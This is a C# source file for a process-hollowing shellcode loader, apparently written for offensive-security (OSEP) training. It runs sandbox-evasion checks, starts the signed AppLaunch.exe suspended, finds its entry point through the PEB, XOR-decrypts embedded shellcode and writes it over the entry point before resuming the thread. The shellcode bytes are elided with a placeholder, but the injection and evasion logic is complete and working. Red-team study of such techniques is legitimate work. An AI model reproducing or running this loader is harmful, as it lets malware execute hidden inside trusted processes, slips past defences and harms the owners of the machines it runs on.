using System;
using System.Runtime.InteropServices;

namespace HollowPayload
{
    public class Runner
    {
        // --- Win32 API Structures ---

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        // --- Win32 API Imports ---

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string name, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        [DllImport("ntdll.dll")]
        private static extern int ZwQueryInformationProcess(IntPtr hProc, int cls, ref PROCESS_BASIC_INFORMATION bi, uint len, ref uint ret);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, [Out] byte[] buf, int size, out IntPtr read);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buf, Int32 size, out IntPtr written);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint ms);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProc, IntPtr addr, uint size, uint type, uint prot, uint node);

        // --- Decryption Helper ---
        private static byte[] Xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        // --- Main Execution Method (Called via Reflection) ---
        public static void Execute()
        {
            // 1. HEURISTIC EVASION: Sleep Check
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

            // 2. HEURISTIC EVASION: Numa Check
            IntPtr check = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (check == IntPtr.Zero) return;

            // 3. CREATE SUSPENDED PROCESS
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si); // CRITICAL: Required for 32-bit stability

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // OSEP Best Practice: Use AppLaunch.exe as it's a signed .NET "nothing" process
            // If running as 32-bit, this path will be redirected correctly or found in Framework
            // For now it's the same path, but this may be changed if needed
            string target = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe";
            if (IntPtr.Size == 8)
            {
                target = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AppLaunch.exe";
            }

            if (!CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) return;

            // 4. LOCATE ENTRY POINT VIA PEB
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)Marshal.SizeOf(bi), ref tmp);

            // PEB architecture-aware offset (x64 = 0x10, x86 = 0x8)
            int offset = (IntPtr.Size == 8) ? 0x10 : 0x8;
            IntPtr ptrToImageBase = (IntPtr)((long)bi.PebBaseAddress + offset);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            // Fix for 32-bit sign-extension when casting addresses
            long baseAddrValue = (IntPtr.Size == 8) ? BitConverter.ToInt64(addrBuf, 0) : (long)BitConverter.ToUInt32(addrBuf, 0);
            IntPtr imageBase = (IntPtr)baseAddrValue;

            // Parse PE Header (first 0x200 bytes)
            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, imageBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)e_lfanew_offset + 0x28);

            // Calculate actual entry point address safely
            IntPtr addressOfEntryPoint = (IntPtr)(baseAddrValue + entrypoint_rva);

            // 5. DECRYPT PAYLOAD
            // IMPORTANT: Ensure this shellcode matches the architecture of the DLL (x86 vs x64)
            byte[] encryptedShellcode = new byte[] { 0xcf, 0x8c, 0xbe, /* ... rest of bytes ... */ 0x5c, 0x13 };
            string key = "3drtghy"; // Your XOR key
            
            byte[] decrypted = Xor(encryptedShellcode, System.Text.Encoding.ASCII.GetBytes(key));

            // 6. INJECT & RESUME
            uint oldProtect;
            if (VirtualProtectEx(pi.hProcess, addressOfEntryPoint, (uint)decrypted.Length, 0x40, out oldProtect))
            {
                IntPtr written;
                if (WriteProcessMemory(pi.hProcess, addressOfEntryPoint, decrypted, decrypted.Length, out written))
                {
                    ResumeThread(pi.hThread);
                }
            }
        }
    }
}
